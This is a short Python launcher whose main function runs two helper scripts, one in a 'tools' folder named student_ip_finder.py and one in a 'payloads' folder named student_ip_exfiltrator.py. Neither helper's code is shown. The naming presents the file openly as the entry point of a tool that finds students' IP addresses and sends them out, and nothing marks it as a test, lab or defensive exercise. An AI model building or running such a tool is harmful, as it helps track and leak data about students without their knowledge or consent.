import subprocess
import os

def main():
    # Run the student IP finder
    student_ip_finder_path = os.path.join(os.path.dirname(__file__), "tools", "student_ip_finder.py")
    subprocess.run(["python3", student_ip_finder_path])

    # Run the student IP exfiltrator
    student_ip_exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "student_ip_exfiltrator.py")
    subprocess.run(["python3", student_ip_exfiltrator_path])

if __name__ == "__main__":
    main()
